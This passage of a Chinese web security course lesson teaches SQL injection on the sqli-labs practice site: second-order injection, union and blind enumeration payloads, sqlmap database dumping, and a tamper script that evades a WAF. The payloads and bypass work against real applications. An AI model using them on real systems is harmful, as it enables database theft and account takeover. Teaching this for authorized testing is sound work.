符型注入，我们主要通过注入参数类型来判断。
</p>

<p>
我还介绍了 6 大 SQL 注入测试技术，这是挖掘和利用 SQL注入漏洞的基础，只
有掌握这些测试技术，才能进一步提升对 SQL注入的理解与实践能力。
</p>

<p>
SQL注入通常被视为高危或严重的漏洞，一些漏洞奖励平台对此的赏金也会很高，
尤其是在国外，经常在5000 美金以上，甚至有的是几万美金。
</p>

<p>
在学习之后，你也可以尝试去挖一些国内的 SRC 平台或者国外 HackerOne平台
授权的测试网站。如果你有发现什么有趣的 SQL注入漏洞，欢迎在留言区分享。
</p>


<figure id="orgf346cf0">
<img src="./images/CgqCHl_taF6AUy71AAUbxs9dlU0807.png" alt="CgqCHl_taF6AUy71AAUbxs9dlU0807.png" width="80%">

</figure>



<p>
这一讲，我会向你介绍二次注入、手工注入和自动化利用漏洞。
</p>

<p>
上一讲我讲解了 SQL注入漏洞相关的基础知识，漏洞的产生是因为直接将用户输
入的数据带入了 SQL语言。但在特殊情况下，有可能第一次带入参数时做了安全
转义，但开发人员在二次使用时并没有做转义，导致第二次使用时才产生注入，
这就是二次注入。
</p>
</div>
</div>
<div id="outline-container-二次注入" class="outline-3">
<h3 id="二次注入">二次注入</h3>
<div class="outline-text-3" id="text-二次注入">
<p>
由于单引号常常被用来检测 SQL注入，开发同学经常会把它过滤掉（删除）或者
转义。最常用的方式就是mysql_real_escape_string 函数，它能够对以下几种
常见字符进行转义：
</p>

<ul class="org-ul">
<li>\x00</li>

<li>\n</li>

<li>\r</li>

<li>\</li>

<li>'</li>

<li>"</li>

<li>\x1a</li>
</ul>

<p>
比如单引号，会在前面添加反斜杠，转义成'，这样就不会直接被当作引号解析
了。mysql_real_escape_string的处理方法对于防范字符型注入有明显的效果，
但有时仍会被绕过，比如整数型注入时采用延时方法检测，以及我要在这里讲的
二次注入。
</p>

<p>
那二次注入具体是什么呢？这里以 sqli-labs 中的第 24 题为例，我们先看下
login.php 中的关键代码：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysql_fetch_row($res);
    //print_r($row) ;
   if ($row[1]) {
            return $row[1];
   } else {
            return 0;
   }
}
$login = sqllogin();
if (!$login== 0) 
{
    $_SESSION["username"] = $login;
    setcookie("Auth", 1, time()+3600);  /* expire in 15 Minutes */
    header('Location: logged-in.php');
}
</pre>
</div>

<p>
可以发现 username 与 password 两个字符串参数都被
mysql_real_escape_string函数过滤掉了，无法使用单引号去闭合语句进行注入，
只能去尝试其他办法。我们继续往下看。
</p>

<p>
登录成功后，将用户名保存到 $_SESSION["username"]，然后再跳转到
logged-in.php。我们重新观察页面，发现上面还有 2个功能：忘记密码、创建
新用户。
</p>


<figure id="orgfd264b5">
<img src="./images/CgqCHl_y7smAF6UEAAAsSPHA6oY677.png" alt="CgqCHl_y7smAF6UEAAAsSPHA6oY677.png" width="80%">

</figure>

<p>
图 1：sqli-labs 第 24 题
</p>

<p>
为了寻找漏洞，我们就需要查看网站上的每个功能。先点击“Forgot your
password?”看看，它会返回以下提示：
</p>


<figure id="org93090bd">
<img src="./images/CgqCHl_y7tWAdGo8AAfcVQqEIIM061.png" alt="CgqCHl_y7tWAdGo8AAfcVQqEIIM061.png" width="80%">

</figure>

<p>
图 2：“Forgot your password?”页面
</p>

<p>
此时，我们查看该页面对应的源码文件forgot_password.php，发现这里除了上
面的图片，没有其他代码。没办法，我们只能返回去。
</p>

<p>
<b>注意</b> ：这一步你可能看我什么都没做，但其实这里是有可能存在漏洞的，只
是在我们的例子中不存在。如果是在其他场景中，请记得检查一下。
</p>

<p>
返回之后我们点击“New User click here?”按钮再找找。
</p>


<figure id="org896ae59">
<img src="./images/Ciqc1F_y7t6AX0LCAAHdWn6LQH4169.png" alt="Ciqc1F_y7t6AX0LCAAHdWn6LQH4169.png" width="80%">

</figure>

<p>
图 3：“New User click here?”页面
</p>

<p>
通过浏览器的地址栏可以看到它跳转到 new_user.php 。查看该源码文件，发现
表单数据被提交到 login_create.php 处理：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;form name="mylogin" method="POST" action="login_create.php"&gt;
</pre>
</div>

<p>
这里我们来重点分析下 login_create.php 的源码：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php

    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    if (isset($_POST['submit']))
    {
        # 校验用户的输入数据，分别是用户、密码、重新输入的密码
        $username=  mysql_escape_string($_POST['username']) ;
        $pass= mysql_escape_string($_POST['password']);
        $re_pass= mysql_escape_string($_POST['re_password']);

        echo "&lt;font size='3' color='#FFFF00'&gt;";
        #查询输入的用户名是否存在，若存在就提醒并停止创建账号
        $sql = "select count(*) from users where username='$username'";
        $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
        $row = mysql_fetch_row($res);  # 获取查询结果

        //print_r($row);
        if (!$row[0]== 0) 
            {
            ?&gt;
            &lt;script&gt;alert("The username Already exists, Please choose a different username ")&lt;/script&gt;;
            &lt;?php
            header('refresh:1, url=new_user.php');
            } 
            else 
            {
                if ($pass==$re_pass)
                {
                    # 若用户名不存在，就创建新的账号和密码
                    $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
                    mysql_query($sql) or die('Error Creating your user account,  : '.mysql_error());
                        echo "&lt;/br&gt;";
                        echo "&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size='3' color='#FFFF00'&gt;";                
                        //echo "&lt;h1&gt;User Created Successfully&lt;/h1&gt;";
                        echo "&lt;/br&gt;";
                        echo "&lt;/br&gt;";
                        echo "&lt;/br&gt;";                  
                        echo "&lt;/br&gt;Redirecting you to login page in 5 sec................";
                        echo "&lt;font size='2'&gt;";
                        echo "&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;";
                        header('refresh:5, url=index.php');
                }
                else
                {
                ?&gt;
                &lt;script&gt;alert('Please make sure that password field and retype password match correctly')&lt;/script&gt;
                &lt;?php
                header('refresh:1, url=new_user.php');
                }
            }
    }
?&gt;
</pre>
</div>

<p>
通过源码可以发现这里的输入参数都被过滤了，然后将新建的用户名和密码插入
到了数据库中。这是第一次将数据带入数据库，但没有产生注入漏洞，我们需要
继续往下分析，寻找有没有可能存在的其他注入点。
</p>

<p>
重新回头再看下登录成功后跳转的 logged-in.php文件源码，它会把密码以表单
形式提交到 pass_change.php：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;form name="mylogin" method="POST" action="pass_change.php"&gt;
</pre>
</div>

<p>
先看下 pass_change.php 文件源码：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">if (isset($_POST['submit']))
{
    # Validating the user input........
    $username= $_SESSION["username"];  // 从数据库取出的用户名未过滤
    $curr_pass= mysql_real_escape_string($_POST['current_password']);
    $pass= mysql_real_escape_string($_POST['password']);
    $re_pass= mysql_real_escape_string($_POST['re_password']);

    if($pass==$re_pass)
    {
        # 未过滤的用户名被带入 SQL 语句，造成 SQL 注入漏洞
        $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
        $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
        $row = mysql_affected_rows();
        echo '&lt;font size="3" color="#FFFF00"&gt;';
        echo '&lt;center&gt;';
        if($row==1)
        {
            echo "Password successfully updated";

        }
        else
        {
            header('Location: failed.php');
            //echo 'You tried to be smart, Try harder!!!! :( ';
        }
    }
    else
    {
        echo '&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;';
        echo "Make sure New Password and Retype Password fields have same value";
        header('refresh:2, url=index.php');
    }
}
</pre>
</div>

<p>
可以看到，从数据库取出来的用户名并没有转义，而我们又可以向数据库插入可
控的用户名，即输入的用户名第一次被转义（非过滤），但拿出来使用时并未做
再转义，这种 <b>写数据时转义，读数据时又未转义，造成了二次注入漏洞的发生</b> 。
如果第一次存储时直接将恶意字符过滤掉的话，那第二次使用就没有问题。
</p>

<p>
因此，我们可以采用如下的攻击步骤。
</p>

<p>
（1）注册一个专门用来攻击的用户名，比如 admin' or 1=1#，密码为 test。
</p>


<figure id="orgf6a0ce2">
<img src="./images/Ciqc1F_y7uyADPwTAAAt1pr_DYg213.png" alt="Ciqc1F_y7uyADPwTAAAt1pr_DYg213.png" width="80%">

</figure>

<p>
图 4：注册新的用户名
</p>

<p>
（2）登录新注册的账号。
</p>


<figure id="org6448c84">
<img src="./images/CgqCHl_y7vSAQ8bBAAAv5Nno1cw204.png" alt="CgqCHl_y7vSAQ8bBAAAv5Nno1cw204.png" width="80%">

</figure>

<p>
图 5：登录新账号
</p>

<p>
（3）修改上面注册的用户密码为 hacker。
</p>


<figure id="org36f0e54">
<img src="./images/Ciqc1F_y7vmAOmU8AABWHp3fjoI705.png" alt="Ciqc1F_y7vmAOmU8AABWHp3fjoI705.png" width="80%">

</figure>

<p>
图 6：修改密码
</p>

<p>
（4）最终用户名 admin' or 1=1# 被注入 SQL执行，导致所有用户密码都被修
改为 hacker。
</p>

<pre class="example" id="orgb8f2f1a">
mysql&gt; select * from users;
+----+----------------+----------+
| id | username       | password |
+----+----------------+----------+
|  1 | Dumb           | hacker   |
|  2 | Angelina       | hacker   |
|  3 | Dummy          | hacker   |
|  4 | secure         | hacker   |
|  5 | stupid         | hacker   |
|  6 | superman       | hacker   |
|  7 | batman         | hacker   |
|  8 | admin          | hacker   |
|  9 | admin1         | hacker   |
| 10 | admin2         | hacker   |
| 11 | admin3         | hacker   |
| 12 | dhakkan        | hacker   |
| 14 | admin4         | hacker   |
| 15 | 1              | hacker   |
| 17 | admin' or 1=1# | hacker   |
+----+----------------+----------+
15 rows in set (0.00 sec)
</pre>

<p>
（5）尝试用密码 hacker 登录账号 admin，如下所示，登录成功！
</p>


<figure id="org5678608">
<img src="./images/CgqCHl_y7wKAQr6TAAE5rTn8WyU344.png" alt="CgqCHl_y7wKAQr6TAAE5rTn8WyU344.png" width="80%">

</figure>

<p>
图 7： 登录成功
</p>

<p>
你看，从前面一步步地寻找漏洞，到发现 SQL注入漏洞，并成功利用漏洞登录账
号，哪怕不知道正确的密码是什么，也可以登录，这正是SQL 注入神奇的地方所
在。
</p>
</div>
</div>
<div id="outline-container-手工注入" class="outline-3">
<h3 id="手工注入">手工注入</h3>
<div class="outline-text-3" id="text-手工注入">
<p>
为了让你更好地理解 SQL注入漏洞的利用，我会一步步地构造注入参数去利用漏
洞，直到最终拿到账号密码，这样在后面通过工具自动化利用时，你也能更容易
地理解其背后的逻辑。
</p>

<p>
在注入的过程中，常用到的会有以下几个步骤：
</p>

<ul class="org-ul">
<li>获取字段数</li>
<li>枚举系统数据库名</li>
<li>获取当前数据库名</li>
<li>枚举数据库中的表名</li>
<li>枚举表中的字段名</li>
<li>获取字段值</li>
<li>盲注猜解字符串。</li>
</ul>

<p>
这些步骤并不是一定的，我只是列举了一些比较常用的，希望对你能有所帮助。
</p>

<p>
<b>（1）获取字段数</b>
</p>

<p>
在“第06讲”中我讲到了“ <b>联合查询注入</b> ”，我们使用 Union查询注入爆出
了账号和密码，但那是已知字段名的情况下。
</p>

<p>
在真实的漏洞利用场景中，我们需要自己通过 SQL注入获取字段名，在此之前还
得去获取字段数。前面使用的是 union select 1,2,3&#x2026; 的方式不断追加查询
的字段数来猜测，但如果业务就有很多的字段数，这个方法就有点烦琐了。因此，
这里介绍另一种更加简便的方法。
</p>

<p>
通过 order 做字段排序，可以猜解出正确的字段数：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数就是 n-1
</pre>
</div>

<p>
这种方法有时会用来判断是否存在 SQL注入漏洞，同时在使用联合查询方法时，
也可以用来获取读取数据。
</p>

<p>
以 sqli-labs 第 2题为例，构建以下两个不同的请求会发现返回结果是不一样
的，当使用利用“1 order by 3”作为 id 参数时，其返回正常；但当使用“1
order by 4”时却返回错误了：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">正常：http://localhost/Less-2?id=1 order by 3--+
错误：http://localhost/Less-2?id=1 order by 4--+，提示“Unknown column '4' in 'order clause'”
</pre>
</div>

<p>
这就说明正确的字段数是 3，因为当用于排序的字段数大于总字段数时会出错。
</p>

<p>
<b>（2）枚举系统数据库名</b>
</p>

<p>
网站上可能会有多个数据库，为了更直接地查看包含业务数据的数据库，我们先
枚举出系统的数据库名，然后根据数据库名来猜测有敏感信息的可能性，再针对
那个数据库进行测试。
</p>

<p>
在版本号 5.0 以上的 MySQL 中，数据库名存放在 information_schema数据库
下的 schemata 表的 schema_name 字段中：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">mysql&gt; select null,null,schema_name from information_schema.schemata;
+------+------+--------------------+
| NULL | NULL | schema_name        |
+------+------+--------------------+
| NULL | NULL | information_schema |
| NULL | NULL | challenges         |
| NULL | NULL | mysql              |
| NULL | NULL | performance_schema |
| NULL | NULL | security           |
+------+------+--------------------+
5 rows in set (0.00 sec)
</pre>
</div>

<p>
从第一步我们得知字段数是 3 个，那么我们就可以通过 select 读取这 3个字
段的内容。由于这里的测试题目，在网页上只显示 1个字段值，所以我们可以用
group_concat函数将所有的数据库名连接起来，一次性地将多个字段值放在一个
字段中显示。这里我把它放在了第3 个字段中：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=0 union select 1,2,group_concat(schema_name) from information_schema.schemata
</pre>
</div>


<figure id="orgb2e14b6">
<img src="./images/Cip5yF_y7-qAIZdsAADRujoDa5o025.png" alt="Cip5yF_y7-qAIZdsAADRujoDa5o025.png" width="80%">

</figure>

<p>
图 8： 系统数据库名
</p>

<p>
可以看到各个数据库名已经回显出来了。
</p>

<p>
<b>（3）获取当前数据库名</b>
</p>

<p>
通过当前页面的功能，我们可以知道它当前的数据库会涉及哪些数据，比如当前
是账号创建和登录的页面，数据库必然包含账号密码信息，我们就可以先获取当
前数据库名，后面再用来读取数据库中的字段值。MySQL提供的 database() 函
数可用来获取数据库名，因此我们可以像下面这样构建URL：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=0 union select 1,2,database()--+
</pre>
</div>

<p>
访问后我们得到当前数据库名为security，接下来就可以去尝试读取该数据库内
的内容。
</p>

<p>
<b>（4）枚举数据库中的表名</b>
</p>

<p>
通过以下语句获取存储账号密码的表名 users：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
</pre>
</div>

<p>
访问上述特意构造的链接后，页面返回以下内容：
</p>


<figure id="orgdc4e204">
<img src="./images/Cip5yF_y7_OAZnv_AAGOoagH4-c761.png" alt="Cip5yF_y7_OAZnv_AAGOoagH4-c761.png" width="80%">

</figure>

<p>
图 9：数据库中的表名
</p>

<p>
<b>（5）枚举表中的字段名</b>
</p>

<p>
得到表名后，我们可以先看看有哪些字段名，为后面获取字段值做铺垫。由于表
information_schema.columns中包含字段列表信息，因此我们可以通过它获取每
个字段的名称，构造以下 URL获取：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/Less-2/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
</pre>
</div>

<p>
访问后页面返回以下内容，得到表中的各个字段名：
</p>


<figure id="org76edf1e">
<img src="./images/CgqCHl_y7yGAUF0ZAAAojuOFTVI874.png" alt="CgqCHl_y7yGAUF0ZAAAojuOFTVI874.png" width="80%">

</figure>

<p>
图 10：表中的字段名
</p>

<p>
<b>（6）获取字段值</b>
</p>

<p>
前面我们已经拿到字段名、表名，接下来就可以直接通过 select读取相应字段
的值，比如此处用来获取 username 和 password 的值的 URL请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/Less-2/?id=0 union select 1,2,group_concat(username,': ',password) from users--+
</pre>
</div>

<p>
访问后页面返回各字段值：
</p>


<figure id="org805848e">
<img src="./images/CgpVE1_y7_uAa4SGAADxQK_Xy8o851.png" alt="CgpVE1_y7_uAa4SGAADxQK_Xy8o851.png" width="80%">

</figure>

<p>
图 11：各字段的值
</p>

<p>
<b>（7）盲注猜解字符串</b>
</p>

<p>
前面的示例都是在有错误回显的情况下，通过 SQL注入获得我们想要的用户信息，
但有时在渗透测试时，网站并没有错误回显，此时就只能去盲注猜解出数据库名、
字段名和值等关键信息。盲注猜解字符串的主要方式有布尔型盲注和基于时间延
迟盲注，相关的知识我在《06 ​| SQL 注入：小心数据库被拖走（上）》中介绍
过了。
</p>

<pre class="example" id="orgd6d9d9e">
布尔型盲注：
http://localhost/Less-2/?id=1 and ascii(substr((select database()),1,1))&gt;110--+ 判断数据库名的第一个字符的 ascii 值是否大于 110('H')

基于时间延迟盲注：
http://localhost/Less-2/?id=1 union select if(SUBSTRING(password,1,4)='Dumb',sleep(5),1),2,3 from users--+ 提取密码前四个字符做判断，正确就延迟 5 秒，错误返回 1
</pre>
</div>
</div>
<div id="outline-container-自动化利用漏洞" class="outline-3">
<h3 id="自动化利用漏洞">自动化利用漏洞</h3>
<div class="outline-text-3" id="text-自动化利用漏洞">
<p>
手工注入是个体力活，效率很慢，如果能自动化地利用漏洞，就可以解放双手，
省下不少时间。因此，通常我们不会使用手工注入的方式。
</p>

<p>
下面我就来介绍如何利用 sqlmap 实现 SQL 注入漏洞的自动化利用。
</p>
</div>
<div id="outline-container-使用-sqlmap-拖库" class="outline-4">
<h4 id="使用-sqlmap-拖库">使用 sqlmap 拖库</h4>
<div class="outline-text-4" id="text-使用-sqlmap-拖库">
<p>
当前在 SQL 注入漏洞利用工具中，sqlmap绝对是最常用的，前文也多次提到它，
这里我们就尝试使用 sqlmap 实现拖库。
</p>

<p>
借助 sqlmap 我们可以通过简单的参数自动完成漏洞的利用，既不用记过多的
SQL语句，也会更加高效。下面我会介绍一些常用的命令参数，通过这些参数，
我们能实现注入自动化。具体的流程和手工注入一样，这里就不再赘述了。
</p>

<p>
<b>（1）使用 &#x2013;dbs 参数获取数据库名称</b> （注意：这里需要 sudo，否则无法访
问docker 容器中的网站），示例命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u "http://localhost/Less-2/?id=1" --dbs
</pre>
</div>


<figure id="org46b0fc7">
<img src="./images/CgpVE1_y7zKAPDYwAAHpwAOclsQ168.png" alt="CgpVE1_y7zKAPDYwAAHpwAOclsQ168.png" width="80%">

</figure>

<p>
图 12：使用 &#x2013;dbs 参数获取数据库名称
</p>

<p>
输出的对应 payload也是学习各种注入技巧的参考资料，对于渗透测试者、漏洞
扫描器、WAF开发者需要研究的重要资源，有些扫描器干脆直接用 sqlmap，或者
把它的所有payload 扣出来使用。
</p>

<p>
<b>（2）使用 &#x2013;current-db 参数获取当前数据库</b> ，示例命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u "http://localhost/Less-2/?id=1" --current-db
</pre>
</div>


<figure id="org6c82fd7">
<img src="./images/CgpVE1_y7zqAXr4gAABQGh6pVVo584.png" alt="CgpVE1_y7zqAXr4gAABQGh6pVVo584.png" width="80%">

</figure>

<p>
图 13：使用 &#x2013;current-db 参数获取当前数据库
</p>

<p>
<b>（3）使用 &#x2013;tables 参数枚举表名</b> ，示例命令如下 ：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u "http://localhost/Less-2/?id=1" --tables -D 'security'
</pre>
</div>


<figure id="org0a83ba1">
<img src="./images/CgpVE1_y70GAQ0C0AACYCKSvjig335.png" alt="CgpVE1_y70GAQ0C0AACYCKSvjig335.png" width="80%">

</figure>

<p>
图 14：使用 &#x2013;tables 参数枚举表名
</p>

<p>
<b>（4）使用 &#x2013;columns 参数枚举字段名</b> ，示例命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u "http://localhost/Less-2/?id=1" --columns -T "users" -D "security"
</pre>
</div>


<figure id="org20d00a8">
<img src="./images/Cip5yF_y70mAVarDAAB9o-Ikd5A077.png" alt="Cip5yF_y70mAVarDAAB9o-Ikd5A077.png" width="80%">

</figure>

<p>
图 15：使用 &#x2013;columns 参数枚举字段名
</p>

<p>
<b>（5）使用 &#x2013;dump 参数批量获取字段值</b> ，示例命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u "http://localhost/Less-2/?id=1" --dump -C "id,password,username" -T "users" -D "security"
</pre>
</div>


<figure id="org458494e">
<img src="./images/CgpVE1_y71GANTBrAAFu3OCaUR4397.png" alt="CgpVE1_y71GANTBrAAFu3OCaUR4397.png" width="80%">

</figure>

<p>
图 16：使用 &#x2013;dump 参数批量获取字段值
</p>

<p>
<b>（6）使用 &#x2013;dump-all 参数导出整个数据库</b> 。
</p>

<p>
这个方法耗时较长，还有很多无价值信息，但却是最简单的拖库姿势，示例命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">./sqlmap.py -u "http://localhost/Less-2/?id=1" --dump-all
</pre>
</div>

<p>
上述方法导出的数据文件存放路径会在命令行给出，数据以 csv文件形式保存到
本地：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">Ubuntu# pwd
/root/.local/share/sqlmap/output/localhost/dump
Ubuntu# tree
.
├── challenges
│   └── 6EAED22Z6T.csv
├── information_schema
│   ├── CHARACTER_SETS.csv
│   ├── COLLATION_CHARACTER_SET_APPLICABILITY.csv
│   ├── COLLATIONS.csv
│   ├── COLUMN_PRIVILEGES.csv
│   ├── COLUMNS.csv
│   ├── ......
│   ├── SCHEMATA.csv
│   ├── SESSION_STATUS.csv
│   ├── SESSION_VARIABLES.csv
│   ├── STATISTICS.csv
│   ├── USER_PRIVILEGES.csv
│   └── VIEWS.csv
├── mysql
│   ├── help_category.csv
│   ├── help_keyword.csv
│   ├── help_relation.csv
│   ├── help_topic.csv
│   ├── proxies_priv.csv
│   ├── servers.csv
│   └── user.csv
├── performance_schema
│   ├── cond_instances.csv
│   ├── ......
│   └── threads.csv
└── security
    ├── emails.csv
    ├── referers.csv
    ├── uagents.csv
    ├── users.csv
    └── users.csv.1
5 directories, 70 files
Ubuntu# cat /root/.local/share/sqlmap/output/localhost/dump/security/users.csv
id,username,password
1,Dumb,Dumb
2,Angelina,I-kill-you
3,Dummy,p@ssword
4,secure,crappy
5,stupid,stupidity
6,superman,genious
7,batman,mob!le
8,admin,admin
9,admin1,admin1
10,admin2,admin2
11,admin3,admin3
12,dhakkan,dumbo
14,admin4,admin4
</pre>
</div>
</div>
</div>
<div id="outline-container-利用-tamper-绕过-waf" class="outline-4">
<h4 id="利用-tamper-绕过-waf">利用 tamper 绕过 WAF</h4>
<div class="outline-text-4" id="text-利用-tamper-绕过-waf">
<p>
在云时代网络中，很多部署网站的服务器都会提供 WAF（Web防火墙）服务。在
未部署的情况下，云厂商如果检测到 Web攻击请求，可能会发短信通知你开启
WAF服务。之前我在一次渗透测试工作中就是如此：原本未部署 WAF 的网站，在
SQL注入的过程中，突然就开启 WAF 拦截了。
</p>

<p>
tamper 正是对 sqlmap 进行扩展的一系列脚本，可在原生 payload的基础上做
进一步的处理以绕过 WAF 拦截。sqlmap 里有个 tamper目录，里面放着很多脚
本，比如编码、字符替换、换行符插入。
</p>

<p>
我们先来看下 sqlmap 自带的一个最简单的，用于转义单引号的 tamper 脚本：
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>
<span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span>
<span style="color: #8b2252;">See the file 'LICENSE' for copying permission</span>
<span style="color: #8b2252;">"""</span>
<span style="color: #a020f0;">from</span> lib.core.enums <span style="color: #a020f0;">import</span> PRIORITY
<span style="color: #a0522d;">__priority__</span> = PRIORITY.NORMAL
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">dependencies</span>():
    <span style="color: #a020f0;">pass</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">tamper</span>(payload, **kwargs):
    <span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">    Slash escape single and double quotes (e.g. ' -&gt; </span><span style="color: #008b8b;">\'</span><span style="color: #8b2252;">)</span>
<span style="color: #8b2252;">    &gt;&gt;&gt; tamper('1" AND SLEEP(5)#')</span>
<span style="color: #8b2252;">    '1</span><span style="color: #008b8b;">\\</span><span style="color: #8b2252;">\\" AND SLEEP(5)#'</span>
<span style="color: #8b2252;">    """</span>
    <span style="color: #a020f0;">return</span> payload.replace(<span style="color: #8b2252;">"'"</span>, <span style="color: #8b2252;">"</span><span style="color: #008b8b;">\\</span><span style="color: #8b2252;">'"</span>).replace(<span style="color: #8b2252;">'"'</span>, <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\\</span><span style="color: #8b2252;">"'</span>)
</pre>
</div>

<p>
它主要由 3 个部分组成。
</p>

<ul class="org-ul">
<li><b>priority</b> ：代表优先级，当使用多个脚本时可定义执行顺序。</li>

<li>dependencies：对依赖环境的声明，比如输出日志，可不写。</li>

<li>tamper：主函数。payload 代表 sqlmap 自带的测试语句；kwargs代表请求参
数，可以用来修改 http 头信息。 <b>tamper 主要是对原生 payload做一些替
换处理，这是绕过 WAF 的关键点</b> 。</li>
</ul>

<p>
下面以某知名网站的 SQL 注入为例。常规的注入语句都被拦截了，后来在 fuzz
测试 WAF 时，发现使用一些特殊符号可以绕过WAF（换行符也经常被用来绕过），
而 MySQL 中有些特殊字符又相当于空格：
</p>

<blockquote>
<p>
%01, %02, %03, %04, %05, %06, %07, %08, %09, %0a, %0b, %0c, %0d, %0e,
%0f, %10, %11, %12, %13, %14, %15, %16, %17, %18, %19, %1a, %1b, %1c,
%1d, %1e, %1f, %20
</p>
</blockquote>

<p>
我们尝试在每个 SQL 关键词中随机加个%1e。测试确认可绕过 WAF后，接下来就
是写 tamper 让 sqlmap 实现自动化绕过 WAF。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re
<span style="color: #a020f0;">from</span> lib.core.common <span style="color: #a020f0;">import</span> randomRange
<span style="color: #a020f0;">from</span> lib.core.data <span style="color: #a020f0;">import</span> kb  <span style="color: #b22222;"># </span><span style="color: #b22222;">kb &#20013;&#23384;&#25918;&#30528; sqlmap &#30340;&#19968;&#20123;&#37197;&#32622;&#20449;&#24687;</span>
<span style="color: #a020f0;">from</span> lib.core.enums <span style="color: #a020f0;">import</span> PRIORITY
<span style="color: #a0522d;">__priority__</span> = PRIORITY.LOW
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">tamper</span>(payload, **kwargs):
    <span style="color: #a0522d;">result</span> = payload
    <span style="color: #a020f0;">if</span> payload:
        <span style="color: #a020f0;">for</span> <span style="color: #a020f0;">match</span> <span style="color: #a020f0;">in</span> re.finditer(r<span style="color: #8b2252;">"\b[A-Za-z_]+\b"</span>, payload):
            <span style="color: #a0522d;">word</span> = <span style="color: #a020f0;">match</span>.group()
            <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(word) &lt; 2:
                <span style="color: #a020f0;">continue</span>
            <span style="color: #a020f0;">if</span> word.upper() <span style="color: #a020f0;">in</span> kb.keywords:  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#26159;&#21542;&#23646;&#20110; SQL &#20851;&#38190;&#35789;</span>
                <span style="color: #483d8b;">str</span> = word[0]
                <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">xrange</span>(1, <span style="color: #483d8b;">len</span>(word) - 1):
                    <span style="color: #483d8b;">str</span> += <span style="color: #8b2252;">"%s%s"</span> % (<span style="color: #8b2252;">"%1e"</span> <span style="color: #a020f0;">if</span> randomRange(0, 1) <span style="color: #a020f0;">else</span> <span style="color: #8b2252;">""</span>, word[i])
                <span style="color: #483d8b;">str</span> += word[-1]
                <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">"%1e"</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">str</span>:
                    <span style="color: #a0522d;">index</span> = randomRange(1, <span style="color: #483d8b;">len</span>(word) - 1)
                    <span style="color: #483d8b;">str</span> = word[:index] + <span style="color: #8b2252;">"%1e"</span> + word[index:]
                <span style="color: #a0522d;">result</span> = result.replace(word, <span style="color: #483d8b;">str</span>)
    <span style="color: #a020f0;">return</span> result
</pre>
</div>

<p>
上述代码会判断输入的字符串是否有 SQL关键词，如果有就随机在关键词中间插
入%1e。
</p>

<p>
假设原注入语句为：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">and ascii(substr((select database()),1,1))&gt;64
</pre>
</div>

<p>
经转换后变成：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">a%1end a%1escii(sub%1estr((s%1eelect da%1etabase()),1,1))&gt;64
</pre>
</div>

<p>
最后调用 sqlmap 执行即可：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">./sqlmap.py -u url --tamper=bypasswaf.py --dbs
</pre>
</div>

<p>
到这里咱们就完成请求参数的修改了，这是用来绕过 WAF 是非常有效的手段。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我主要介绍了二次注入产生的原理，以及如何利用 SQL注入漏洞，包括手
工注入及使用 sqlmap 实现自动化漏洞。
</p>

<p>
